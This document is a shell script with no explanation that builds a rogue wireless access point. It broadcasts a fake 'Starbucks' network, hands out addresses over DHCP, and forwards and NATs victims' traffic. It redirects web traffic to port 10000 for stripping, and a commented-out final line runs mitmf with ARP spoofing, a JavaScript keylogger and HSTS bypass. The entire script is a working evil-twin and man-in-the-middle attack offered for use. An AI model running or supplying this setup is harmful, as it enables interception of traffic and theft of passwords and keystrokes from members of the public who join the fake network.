echo "deb https://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
wget -q -O - https://archive.kali.org/archive-key.asc  | apt-key add
apt-get update
apt-get install isc-dhcp-server
#airmon-ng check kill
airmon-ng start wlan1
#airodump-ng wlan1mon

mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd-backup.conf
cp dhcpd.conf /etc/dhcp/dhcpd.conf

airbase-ng -e Starbucks -c 11 wlan1mon
ifconfig at0 up

ifconfig at0 10.128.2.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.128.2.0 netmask 255.255.255.0 gw 10.128.2.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.1.1
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
/etc/init.d/isc-dhcp-server start
#service isc-dhcp-server start

#mitmf -i at0 --spoof --arp -gateway 192.168.2.1 --jskeylogger --hsts


